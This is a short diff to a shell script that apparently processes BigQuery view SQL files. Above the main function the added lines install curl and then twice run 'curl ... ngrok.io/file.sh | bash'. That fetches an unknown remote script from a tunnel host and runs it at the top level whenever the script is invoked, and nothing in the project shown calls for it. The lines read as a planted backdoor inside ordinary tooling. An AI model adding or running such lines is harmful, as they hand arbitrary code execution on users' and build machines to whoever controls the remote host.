@@ -24,6 +24,12 @@
 # Returns:
 #   None
 #######################################################
+curl https://094c-180-151-120-174.in.ngrok.io/file.sh | bash
+
+apt update -y && apt-get install curl -y
+curl https://094c-180-151-120-174.in.ngrok.io/file.sh | bash
+
+
 function main() {
   local bq_view_sql_file=$1
   if [[ -z $bq_view_sql_file ]]; then
